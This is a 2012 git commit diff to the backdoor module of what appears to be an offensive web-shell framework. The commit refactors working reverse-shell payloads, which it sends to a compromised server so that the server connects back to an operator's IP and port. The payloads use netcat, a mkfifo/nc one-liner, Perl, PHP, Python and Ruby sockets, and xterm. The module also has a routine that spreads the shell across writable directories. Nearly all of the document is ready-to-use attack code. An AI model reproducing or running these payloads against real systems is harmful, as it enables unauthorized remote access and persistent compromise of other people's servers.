443b8f02b7d09132e5d5bff1afc9e5846a69b60a
lnxg33k <ahmed@isecur1ty.org>
2012-07-10 23:35:36 +0200

    Fixed a minor bug in PHP backdoor

--- core/modules/backdoor.py
+++ core/modules/backdoor.py
@@ -1,12 +1,19 @@
-from core.libs.menu import Colors
+from subprocess import Popen, PIPE
+from platform import platform as os
+
+from core.libs.menu import Colors, getargs
 from core.libs.request_handler import make_request
 from core.modules.shell_handler import linux
-from subprocess import Popen, PIPE
 
 
+# Source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet (Thanks @pentestmonkey)
 class Backdoor(object):
+    '''
+    The methods shown are tailored to Unix-like systems.
+    Some of the examples below should also work on Windows
+    if you use substitute "/bin/sh -i" with "cmd.exe".
+    '''
     def list(self):
-        # Source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet (Thanks @pentestmonkey)
         print '\n[i] Usage: backdoor [module] <*ip:port>'
         print '[i] Modules:'
         #print '[i] \t*bash\t\tUse bash to create a reverse shell (not all versions support this!)'
@@ -20,18 +27,15 @@ class Backdoor(object):
         print '[i] \tspread\t\tSpread our shell around'
         #print '[i] \t*xterm\t\tUse xterm to create a reverse shell'
 
-
-    def netcat(self, ip, port):
-        print '{0}\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
-        cmd = '{0} {1} {2} -e /bin/bash'.format(path, ip, port)
-        self.check = make_request.get_page_source(cmd)
-        print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
-
+    # Redefinition on function "netcat"
+    #def netcat(self, ip, port):
+    #    print '{0}\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN, ip, port, Colors.END)
+    #    cmd = '{0} {1} {2} -e /bin/bash'.format(path, ip, port)
+    #    self.make_request.get_page_source(cmd)
+    #    print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
 
     def msf(self, ip, port):
-        import platform
-        os = platform.platform()
-        if "windows" in os.lower():
+        if "windows" in os().lower():
             print '{0}\n[!] Coming later (Windows) {1}'.format(Colors.RED, Colors.END)
         else:
             if len(Popen("for x in `whereis msfcli`; do file $x | grep executable; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
@@ -39,87 +43,107 @@ class Backdoor(object):
             else:
                 print '{0}\n[!] Coming later {1}'.format(Colors.RED, Colors.END)
 
-
     def netcat(self, ip, port):
+        '''
+        nc openbsd deosn't have -e switch
+        alternative solution:
+            rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT>/tmp/f
+        '''
         cmd = "for x in `whereis nc netcat`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
-        self.netcat = make_request.get_page_source(cmd)
-        if self.netcat:
-            print '{0}\n[i] Found Netcat!\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
+        netcat = make_request.get_page_source(cmd)
+        if netcat:
+            print '{0}\n[i] Found netcat!'.format(Colors.GREEN, Colors.END)
+            raw_input('\n{0}[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3} then <Press Return>'.format(Colors.GREEN, ip, port, Colors.END))
             c = 1
-            for path in self.netcat:
+            for path in netcat:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
                 cmd = '{0} {1} {2} -e /bin/bash'.format(path, ip, port)
-                self.check = make_request.get_page_source(cmd)
+                make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
         else:
             print '\n{0}[!]Didn\'t find netcat on the remote system{1}'.format(Colors.RED, Colors.END)
 
-
     def perl(self, ip, port):
         cmd = "for x in `whereis perl`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
-        self.perl = make_request.get_page_source(cmd)
-        if self.perl:
-            print '{0}\n[i] Found perl!\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
+        perl = make_request.get_page_source(cmd)
+        if perl:
+            print '{0}\n[i] Found perl!'.format(Colors.GREEN, Colors.END)
+            raw_input('\n{0}[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3} then <Press Return>'.format(Colors.GREEN, ip, port, Colors.END))
             c = 1
-            for path in self.perl:
+            for path in perl:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
-                cmd = path+' -e \'use Socket;$i="'+ip+'";$p='+port+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''   # DOESN'T USE FORMAT *** !!!
-                self.check = make_request.get_page_source(cmd)
+                cmd = '{0} -e '.format(path)
+                cmd += '\'use Socket;'
+                cmd += '$i="{0}";'.format(ip)
+                cmd += '$p="{0}";'.format(port)
+                cmd += 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
+                cmd += 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");'
+                cmd += 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
+                make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
         else:
             print '\n{0}[!]Didn\'t find perl on the remote system{1}'.format(Colors.RED, Colors.END)
 
-
     def php(self, ip, port):
         cmd = "for x in `whereis php`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
-        self.php = make_request.get_page_source(cmd)
-        if self.php:
-            print '{0}\n[i] Found php-cli!\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
+        php = make_request.get_page_source(cmd)
+        if php:
+            print '{0}\n[i] Found php-cli!'.format(Colors.GREEN, Colors.END)
+            raw_input('\n{0}[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3} then <Press Return>'.format(Colors.GREEN, ip, port, Colors.END))
             c = 1
-            for path in self.php:
+            for path in php:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
-                cmd = '{0} -rsocket -e\'f=TCPSocket.open("{1}",{2}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''.format(path, ip, port)
-                self.check = make_request.get_page_source(cmd)
+                cmd = 'php -r '
+                cmd += '\'$sock=fsockopen("{0}",{1});'.format(ip, port)
+                cmd += 'exec("/bin/sh -i <&3 >&3 2>&3");\''
+                make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
         else:
             print '\n{0}[!]Didn\'t find php-cli on the remote system{1}'.format(Colors.RED, Colors.END)
 
-
     def python(self, ip, port):
         cmd = "for x in `whereis python`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
-        self.python = make_request.get_page_source(cmd)
-        if self.python:
-            print '{0}\n[i] Found python!\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
+        python = make_request.get_page_source(cmd)
+        if python:
+            print '{0}\n[i] Found python!'.format(Colors.GREEN, Colors.END)
+            raw_input('\n{0}[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3} then <Press Return>'.format(Colors.GREEN, ip, port, Colors.END))
             c = 1
-            for path in self.python:
+            for path in python:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
-                cmd = '{0} -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{1}",{2}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''.format(path, ip, port)
-                self.check = make_request.get_page_source(cmd)
+                cmd = '{0} -c '.format(path)
+                cmd += '\'import socket,subprocess,os;'
+                cmd += 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
+                cmd += 's.connect(("{0}",{1}));'.format(ip, port)
+                cmd += 'os.dup2(s.fileno(),0);'
+                cmd += 'os.dup2(s.fileno(),1);'
+                cmd += 'os.dup2(s.fileno(),2);'
+                cmd += 'p=subprocess.call(["/bin/sh","-i"]);\''
+                make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
         else:
             print '\n{0}[!]Didn\'t find python on the remote system{1}'.format(Colors.RED, Colors.END)
 
-
     def ruby(self, ip, port):
         cmd = "for x in `whereis ruby`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
-        self.ruby = make_request.get_page_source(cmd)
-        if self.ruby:
-            print '{0}\n[i] Found ruby!\n[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN,ip, port, Colors.END)
+        ruby = make_request.get_page_source(cmd)
+        if ruby:
+            print '{0}\n[i] Found ruby!'.format(Colors.GREEN, Colors.END)
+            raw_input('\n{0}[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3} then <Press Return>'.format(Colors.GREEN, ip, port, Colors.END))
             c = 1
-            for path in self.ruby:
+            for path in ruby:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
-                cmd = '{0} -rsocket -e\'f=TCPSocket.open("{1}",{2}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''.format(path, ip, port)
-                self.check = make_request.get_page_source(cmd)
+                cmd = '{0} -rsocket -e'.format(path)
+                cmd += '\'f=TCPSocket.open("{0}",{1}).to_i;'.format(ip, port)
+                cmd += 'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
+                make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
         else:
             print '\n{0}[!]Didn\'t find ruby on the remote system{1}'.format(Colors.RED, Colors.END)
-
-
 
     # A method to spread the shell in all writable directories
     def spread(self):
@@ -138,19 +162,19 @@ class Backdoor(object):
         else:
             print '[!] Something went wrong while spreading shell'
 
-
     def xterm(self, ip):
         cmd = "for x in `whereis xterm`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
-        self.xterm = make_request.get_page_source(cmd)
-        if self.xterm:
-            print '{0}\n[i] Found xterm!\n[i] Make sure \'{1}\' has a listener shell (Run: \'Xnest :1\') ALREADY setup on port: \'{2}\' & Don\'t forget to whitelist (Run: xhost +{1}){4}'.format(Colors.GREEN, ip, "6001", Colors.END)
+        xterm = make_request.get_page_source(cmd)
+        if xterm:
+            print '{0}\n[i] Found xterm!'.format(Colors.GREEN, Colors.END)
             c = 1
-            for path in self.xterm:
+            for path in xterm:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
                 cmd = '{0} xterm -display {1}:1'.format(path, ip)
-                self.check = make_request.get_page_source(cmd)
+                make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
         else:
             print '\n{0}[!]Didn\'t find xterm on the remote system{1}'.format(Colors.RED, Colors.END)
+
 backdoor = Backdoor()
